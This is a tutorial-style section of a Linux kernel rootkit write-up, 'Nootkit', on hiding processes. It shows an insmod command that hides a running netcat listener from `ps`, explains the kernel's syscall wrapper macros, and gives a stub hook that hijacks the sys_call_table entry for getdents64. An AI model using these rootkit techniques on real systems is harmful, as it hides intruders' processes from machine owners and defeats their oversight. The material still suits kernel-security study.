# Nootkit Section 4 - Hiding Processes

`ps`, surprise surprise, gets data for running processes from procfs. Namely, by `getdents64`ing
`/proc` and digging in to each found dir (probably only those whose names are numbers).

We could theoretically hide processes using our existing filename or inode hider, however both of
those aren't comfy to use for hiding processes...

We can make sure that hiding from `getdents64` achieves the goal by simply hiding some existing
proc dir by filename or inode number:

```sh
ps -fade | grep nc
>>> root        7020     989  0 01:21 pts/0    00:00:00 nc -l 1337
>>> root        8297     989  0 10:18 pts/0    00:00:00 grep --color=auto nc

insmod /nootkit.ko \
kallsyms_lookup_name=0x$(cat /proc/kallsyms | grep "\bkallsyms_lookup_name\b" | cut -d " " -f 1) \
hide_filenames=7020
>>> root        8297     989  0 10:18 pts/0    00:00:00 grep --color=auto nc
```

This section may have been supposed to be a no-op, but we'll do some work anyway to prevent having to
find the inode number for a process dir or just hiding a name which might also exist elsewhere -
let's implement hiding full paths. And to do that we can also add a hooking method to our existing
framework, to hook a syscall from the syscall table.

## Hiding Full File Paths

As we might recall, the syscall function for `getdents64` gets a file descriptor as an argument:

```C
SYSCALL_DEFINE3(getdents64, unsigned int, fd,
    struct linux_dirent64 __user *, dirent, unsigned int, count)
```

I happen to know we can get a full file path from a file descriptor. These two facts merge well together.

## Hooking A Syscall

Syscalls are special, as they have their own calling convention different from regular C functions in the
kernel. I'd like to mimic this argument parsing to be able to hook syscall functions.

### Hijacking A Syscall Table Entry

I happen to know the `sys_call_table` symbol contains an array of function pointers indexed by syscall numbers -
those are called when their respective syscall is invoked. Praise [pwnable.kr](https://test.serpent.zip/browser/)!

```C
// arch/x86/um/shared/sysdep/syscalls_64.h

extern syscall_handler_t *sys_call_table[];

#define EXECUTE_SYSCALL(syscall, regs) \
    (((long (*)(long, long, long, long, long, long)) \
      (*sys_call_table[syscall]))(UPT_SYSCALL_ARG1(&regs->regs), \
                      UPT_SYSCALL_ARG2(&regs->regs), \
                      UPT_SYSCALL_ARG3(&regs->regs), \
                      UPT_SYSCALL_ARG4(&regs->regs), \
                      UPT_SYSCALL_ARG5(&regs->regs), \
                      UPT_SYSCALL_ARG6(&regs->regs)))
```

Unfortunately the symbol `sys_call_table` is unexported. Fortunately we can already handle that.

### Syscall Definitions

And the Rust folks say preprocessing is dead... It's quite alive and well here in Linux Land.

I won't get into all the details, but `SYSCALL_DEFINE3` expands to (among the rest) the architechture specific
`__SYSCALL_DEFINEx`, which in our case is:

```C
// arch/x86/include/asm/syscall_wrapper.h

#define __SYSCALL_DEFINEx(x, name, ...)                                 \
    static long __se_sys##name(__MAP(x,__SC_LONG,__VA_ARGS__));         \
    static inline long __do_sys##name(__MAP(x,__SC_DECL,__VA_ARGS__));  \
    __X64_SYS_STUBx(x, name, __VA_ARGS__)                               \
    __IA32_SYS_STUBx(x, name, __VA_ARGS__)                              \
    static long __se_sys##name(__MAP(x,__SC_LONG,__VA_ARGS__))          \
    {                                                                   \
        long ret = __do_sys##name(__MAP(x,__SC_CAST,__VA_ARGS__));      \
        __MAP(x,__SC_TEST,__VA_ARGS__);                                 \
        __PROTECT(x, ret,__MAP(x,__SC_ARGS,__VA_ARGS__));               \
        return ret;                                                     \
    }                                                                   \
    static inline long __do_sys##name(__MAP(x,__SC_DECL,__VA_ARGS__))
```

The `x` is the amount of arguments to the syscall.

So in the end, the actual function declaration which is assigned to the code block below `SYSCALL_DEFINE3`
is this:

```C
static inline long __do_sys##name(__MAP(x,__SC_DECL,__VA_ARGS__))
```

And the magic of syscall calling convention parsing seems to happen within the `__MAP` macro invocation:

```C
// include/linux/syscalls.h

/*
 * __MAP - apply a macro to syscall arguments
 * __MAP(n, m, t1, a1, t2, a2, ..., tn, an) will expand to
 *    m(t1, a1), m(t2, a2), ..., m(tn, an)
 * The first argument must be equal to the amount of type/name
 * pairs given.  Note that this list of pairs (i.e. the arguments
 * of __MAP starting at the third one) is in the same format as
 * for SYSCALL_DEFINE<n>/COMPAT_SYSCALL_DEFINE<n>
 */
#define __MAP0(m,...)
#define __MAP1(m,t,a,...) m(t,a)
#define __MAP2(m,t,a,...) m(t,a), __MAP1(m,__VA_ARGS__)
#define __MAP3(m,t,a,...) m(t,a), __MAP2(m,__VA_ARGS__)
#define __MAP4(m,t,a,...) m(t,a), __MAP3(m,__VA_ARGS__)
#define __MAP5(m,t,a,...) m(t,a), __MAP4(m,__VA_ARGS__)
#define __MAP6(m,t,a,...) m(t,a), __MAP5(m,__VA_ARGS__)
#define __MAP(n,...) __MAP##n(__VA_ARGS__)

#define __SC_DECL(t, a) t a
```

However, from this piece of documentation it seems that the initially called function is not the `__do_sys##name`
part, but rather the `__x64_sys_##name` part:

```C
// arch/x86/include/asm/syscall_wrapper.h

/*
 * Instead of the generic __SYSCALL_DEFINEx() definition, the x86 version takes
 * struct pt_regs *regs as the only argument of the syscall stub(s) named as:
 * __x64_sys_*()         - 64-bit native syscall
 * __ia32_sys_*()        - 32-bit native syscall or common compat syscall
 * __ia32_compat_sys_*() - 32-bit compat syscall
 * __x64_compat_sys_*()  - 64-bit X32 compat syscall
 *
 * The registers are decoded according to the ABI:
 * 64-bit: RDI, RSI, RDX, R10, R8, R9
 * 32-bit: EBX, ECX, EDX, ESI, EDI, EBP
 *
 * The stub then passes the decoded arguments to the __se_sys_*() wrapper to
 * perform sign-extension (omitted for zero-argument syscalls).  Finally the
 * arguments are passed to the __do_sys_*() function which is the actual
 * syscall.  These wrappers are marked as inline so the compiler can optimize
 * the functions where appropriate.
 ...
```

Does this mean that by hijacking a syscall table entry, we'll actually have to decode a `struct pt_regs`
and handle both 64 and 32 bit compat ABIs?

Seems a little weird that there would be 2 functions, as `sys_call_table` members are the size of just one pointer -
I'm guessing there's another layer of indirection?

Hmm, it seems that there isn't another indirection though:

```C
// arch/x86/entry/syscall_64.c

#define __SYSCALL(nr, sym) extern long __x64_##sym(const struct pt_regs *);
#include <asm/syscalls_64.h>
#undef __SYSCALL

#define __SYSCALL(nr, sym) __x64_##sym,

asmlinkage const sys_call_ptr_t sys_call_table[] = {
#include <asm/syscalls_64.h>
};
```

The contents of `sys_call_table` seem to be actual addresses of `__x64_sys_*` functions.
Other ABIs are revealed through other `sys_call_table`s so it seems:

```C
// arch/x86/entry/syscall_32.c

#define __SYSCALL(nr, sym) extern long __ia32_##sym(const struct pt_regs *);

#include <asm/syscalls_32.h>
#undef __SYSCALL

#define __SYSCALL(nr, sym) __ia32_##sym,

__visible const sys_call_ptr_t ia32_sys_call_table[] = {
#include <asm/syscalls_32.h>
};
```

We can make sure we're correct by reading the syscall table at the index of a syscall number (like `getdents64` == 217),
and compare it to kallsyms:

```C
printk(KERN_INFO "content of sys_call_table[217] = %lx", (unsigned long)ksyms__sys_call_table[217]);
```

```sh
dmesg
>>> [49321.441325] content of sys_call_table[217] = ffffffffa61aace0

grep ffffffffa61aace0 /proc/kallsyms
>>> ffffffffa61aace0 T __x64_sys_getdents64
```

Cool! So we won't have to imitate both ABIs through a single function however that might work,
but we do have to receive a `struct pt_regs` as the argument.

## Syscall Hooking Implementation

Here's how to define a valid syscall function for the x64 syscall table, and even use it's arguments
rather neatly:

```C
#include <linux/syscalls.h>
#include <asm/syscall_wrapper.h>

static long getdents64_hook_inner(__MAP(3, __SC_LONG,
    unsigned int, fd,
    struct linux_dirent __user *, dirent,
    unsigned int, count))
{
    printk(KERN_INFO "Running getdents64 on fd %ld!", fd);
    return 0;
}

static long __x64_sys_getdents64_hook(const struct pt_regs *regs)
{
    getdents64_hook_inner(SC_X86_64_REGS_TO_ARGS(3,
        unsigned int, fd,
        struct linux_dirent __user *, dirent,
        unsigned int, count));
    return hook_original__x64_sys_getdents64(regs);
}
```

Hijacking the 217 entry in the syscall table and putting in it the address of `__x64_sys_getdents64_hook`
(when `__x64_sys_getdents64_original` is the original value in the table), we can successfully see file descriptor
numbers being printed, which I think is really cool!

After some algorithmic work and framework updates, a hook was born. See the implementation at [src/hide/readdir.c](../src/hide/readdir.c).
